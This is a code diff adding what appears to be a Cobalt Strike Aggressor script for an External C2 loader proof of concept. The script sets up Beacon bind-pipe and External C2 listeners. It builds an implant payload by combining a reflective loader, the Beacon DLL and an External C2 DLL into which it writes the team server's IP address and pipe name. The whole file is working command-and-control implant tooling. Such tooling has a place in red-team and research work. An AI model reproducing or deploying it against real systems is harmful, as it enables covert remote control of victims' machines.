@@ -1,0 +1,131 @@
+global('$external_c2_ip_address $pipe_name')
+
+# ===========================================================================
+#                                  Utils
+# ===========================================================================
+
+# ----------------------------------------------
+# Print information to the Script Console
+# $1 = message
+# ----------------------------------------------
+sub print_info {
+   println(formatDate("[HH:mm:ss] ") . "\cE[UDRL-VS]\o " . $1);
+}
+
+# ------------------------------------
+# Set up the required server/listener for the extc2-loader PoC
+#
+# $1 = external C2 server's port
+# $2 = smb pipe name
+# ------------------------------------
+sub setup_listeners {
+    local('$port_number $pipe_name');
+    $port_number = $1;
+    $pipe_name = $2;
+
+    # Check if the extc2-pipe-listener exists
+    if (listener_info("extc2-pipe-listener", "name") is $null) {
+        listener_create_ext("extc2-pipe-listener", "windows/beacon_bind_pipe", %(port => $pipe_name));
+    }
+    # Check if the extc2-server exists
+    if (listener_info("extc2-server", "name") is $null) {
+        listener_create_ext("extc2-server", "windows/beacon_extc2", %(port => $port_number));
+    }
+}
+
+# ------------------------------------
+# A wrapper around strrep to pad the new string prior to replacing it.
+#
+# $1 = input dll
+# $2 = original string
+# $3 = new string
+# return = the modified byte sequence
+# ------------------------------------
+sub strrep_pad {
+    local('$difference $input_dll $new_byte_sequence $new_byte_sequence_length $new_byte_sequence_padded $original_byte_sequence $original_byte_sequence_length $padding');
+    $input_dll = $1;
+    $original_byte_sequence = $2;
+    $new_byte_sequence = $3;
+
+    $original_byte_sequence_length = strlen($original_byte_sequence);
+    $new_byte_sequence_length = strlen($new_byte_sequence);
+
+    if($new_byte_sequence_length > $original_byte_sequence_length) {
+        warn("strrep: input string is too large. exiting .. ");
+        return $null;
+    } 
+
+    $difference = $original_byte_sequence_length - $new_byte_sequence_length;
+
+    if ($difference != 0) {
+        $padding = "\x00" x $difference;
+        $new_byte_sequence_padded = $new_byte_sequence . $padding;
+    }
+    else {
+        $new_byte_sequence_padded = $new_byte_sequence;
+    }
+    
+    return strrep($input_dll, $original_byte_sequence, $new_byte_sequence_padded);
+}
+
+# ===========================================================================
+#                      Prepend UDRL + External C2 DLL
+# ===========================================================================
+
+print_info("ExtC2 Loader (Debug)");
+set BEACON_RDLL_GENERATE {
+    # Declare local variables
+    local('$arch $beacon $extc2_dll $extc2_dll_path $file_handle $ldr $loader_path');
+    $beacon = $2;
+    $arch = $3;
+
+    # Read the UDRL
+    $loader_path = getFileProper(script_resource("Release"), $arch ,"extc2-loader." . $arch . ".bin" );
+    $file_handle = openf($loader_path);
+    $ldr = readb($file_handle, -1);
+    closef($file_handle);
+    if (strlen($ldr) == 0) {
+        warn("Error: Failed to read $loader_path");
+        return $null;
+    }
+
+    # Read the External C2 DLL
+    $extc2_dll_path = getFileProper(script_resource("extc2-dll"), "Release", $arch ,"extc2-dll.dll");
+    $file_handle = openf($extc2_dll_path);
+    $extc2_dll = readb($file_handle, -1);
+    closef($file_handle);
+    if (strlen($extc2_dll) == 0) {
+        warn("Error: Failed to read $extc2_dll_path");
+        return $null;
+    }
+
+    # Stomp the pipe name and the External C2 server's IP address in to External C2 DLL
+    $extc2_dll = strrep_pad($extc2_dll, "EXTC2_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE", $pipe_name);
+    $extc2_dll = strrep_pad($extc2_dll, "999.999.999.999", $external_c2_ip_address);
+
+    # Pack the raw size of Beacon to simplify the loader
+    $raw_size_of_beacon = pack("I-", strlen($beacon));
+
+    # Create the payload (without the loader)
+    $payload = $raw_size_of_beacon . $beacon . $extc2_dll;
+
+    print_info("Payload Size: " . strlen($payload));
+
+    return $payload;
+}
+
+set BEACON_RDLL_SIZE {
+   return "0";
+}
+
+# ------------------------------------
+# Note: The extc2-loader is a PoC. As a result
+# it requires network visibility of the team server.
+# It also uses the default External C2 port 2222.
+# ------------------------------------
+$external_c2_ip_address = localip();
+$external_c2_port = 2222;
+$pipe_name = "EXTC2PIPE";
+
+# Set up the External C2/Pivot listeners
+setup_listeners($external_c2_port, $pipe_name);
